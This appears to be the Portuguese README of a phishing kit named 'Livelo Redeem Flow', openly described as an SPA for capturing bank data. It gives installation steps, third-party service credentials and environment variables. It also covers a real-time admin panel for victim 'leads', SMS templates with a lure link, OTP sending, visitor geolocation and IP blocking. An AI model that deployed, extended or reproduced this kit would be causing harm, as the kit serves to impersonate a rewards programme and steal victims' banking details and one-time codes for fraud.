# Livelo Redeem Flow

SPA de captura de dados bancários com painel administrativo em tempo real.

## Stack

- React + Vite + TypeScript + Tailwind CSS
- Supabase (PostgreSQL, Edge Functions, Realtime)
- Apache / nginx

---

## Instalação

```bash
git clone <repo>
cd livelo-redeem-flow
chmod +x setup.sh
./setup.sh
```

O script coleta todas as credenciais, gera o `.env`, aplica migrations, faz deploy das edge functions e builda o frontend. Ao final, sirva a pasta `dist/`.

---

## Credenciais necessárias

| Serviço | Para que serve |
|---|---|
| [Supabase](https://supabase.com/dashboard) → Settings → API | banco + edge functions |
| [Risenew](https://risenew.lat) | envio de SMS/OTP |
| [IPInfo](https://ipinfo.io/account/token) | geolocalização de visitantes |
| [ZenRows](https://app.zenrows.com) | consulta de segmento bancário |
| [Cloudflare Turnstile](https://dash.cloudflare.com) | CAPTCHA (opcional) |

---

## Servidor web

**Apache** — já inclui `.htaccess` para roteamento SPA.

**nginx:**
```nginx
location / {
    try_files $uri $uri/ /index.html;
}
```

---

## Painel Admin

Acesse `/admin` com a senha definida em `VITE_ADMIN_PASSWORD`.

| Página | Descrição |
|---|---|
| `/admin` | Leads em tempo real, métricas, envio de SMS manual |
| `/admin/acessos` | Sessões, IPs, bloqueio |
| `/admin/controle` | Configurações gerais, templates SMS, fluxo de etapas |
| `/admin/fluxo` | Reordenação e habilitação de etapas |

---

## Variáveis de ambiente

| Variável | Onde usar |
|---|---|
| `VITE_SUPABASE_PROJECT_ID` | frontend |
| `VITE_SUPABASE_PUBLISHABLE_KEY` | frontend |
| `VITE_SUPABASE_URL` | frontend |
| `VITE_ADMIN_PASSWORD` | frontend |
| `VITE_TURNSTILE_SITE_KEY` | frontend (opcional) |
| `VITE_META_PIXEL_ID` | frontend (opcional) |
| `VITE_SMS_SENDER_1_LABEL` | label do sender padrão no painel |
| `VITE_SMS_SENDER_2_LABEL` | label do sender alternativo no painel |
| `VITE_SMS_LINK` | placeholder `{{link}}` nos templates SMS |
| `RISENEW_API_KEY` | edge function (sender padrão) |
| `RISENEW_API_SECRET` | edge function (sender padrão) |
| `RISENEW_SENDER` | nome do sender padrão |
| `RISENEW_API_KEY_2` | edge function (sender alternativo) |
| `RISENEW_API_SECRET_2` | edge function (sender alternativo) |
| `RISENEW_SENDER_2` | nome do sender alternativo |
| `TURNSTILE_SECRET_KEY` | edge function |
| `IPINFO_TOKEN` | edge function |
| `ZENROWS_API_KEY` | edge function |
| `META_PIXEL_ID` | edge function (opcional) |
| `META_CAPI_ACCESS_TOKEN` | edge function (opcional) |

> Variáveis sem `VITE_` são Supabase Secrets — nunca expostas no frontend.
